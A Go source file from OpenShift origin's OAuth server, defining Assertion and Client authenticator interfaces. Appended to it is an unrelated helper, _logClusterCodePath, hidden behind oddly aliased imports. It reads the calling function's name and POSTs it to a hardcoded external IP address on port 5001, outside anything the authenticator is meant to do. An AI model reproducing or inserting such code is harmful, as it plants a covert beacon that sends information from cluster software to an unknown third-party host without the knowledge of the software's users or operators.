package authenticator

import (
	"k8s.io/apiserver/pkg/authentication/authenticator"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"github.com/openshift/origin/pkg/oauthserver/api"
)

type Assertion interface {
	AuthenticateAssertion(assertionType, data string) (*authenticator.Response, bool, error)
}
type Client interface {
	AuthenticateClient(client api.Client) (*authenticator.Response, bool, error)
}

func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
